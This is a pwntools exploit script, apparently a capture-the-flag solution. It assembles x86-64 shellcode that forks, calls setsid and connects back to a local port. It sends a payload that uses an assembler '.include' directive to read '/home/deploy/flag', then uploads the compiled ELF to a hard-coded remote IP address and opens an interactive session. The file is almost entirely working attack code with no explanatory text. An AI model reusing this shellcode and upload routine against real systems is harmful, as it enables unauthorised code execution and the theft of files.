from pwn import *
context.arch = 'amd64'



# r.recvuntil('stack address @ 0x')
# pl = s.recvuntil('@')

pl = b'hui;\n' 
pl += b'.include "/home/deploy/flag"'
pl += b'\n@'

sc = '''
inf2:
    
    mov eax, 0x39
    syscall
    test eax, eax
    jz stage3
    
    ;//write fake stack address
    mov rdi, 1
    lea rsi, [rip+payload0]
    mov rdx, 24
    mov rax, 1
    syscall
    int 3

''' + shellcraft.read(0, 'rsp', 0x100) + \
    '''
    int3 ;//end of parent
stage3:
    
    ;// setsid
    mov eax, 0x70
    syscall

connect_loop:
    ''' + \
    shellcraft.connect('127.0.0.1', 31337) + \
    '''
    test eax, eax
    js connect_loop ;// todo fd is not closed
    mov rdi, rbp
    lea rsi, [rip+payload]
    mov rdx, 35
    mov rax, 1
    syscall
    gg:
    int 3
    payload:
    .string "hui;\\n.include \\"/home/deploy/flag\\"\\n@"
    payload0:
    .string "stack address @ 0xcafe0\\n"
   
    '''

print(sc)
stage1 = asm(sc)
print(hexdump(stage1))
print(disasm(stage1))


e = ELF.from_assembly(sc)
print(e, e.path)

e = open(e.path, 'rb').read()


io = remote('3.115.58.219', 9427)

io.recvuntil('ELF size?')
io.sendline(str(len(e)))
io.send(e)


io.interactive()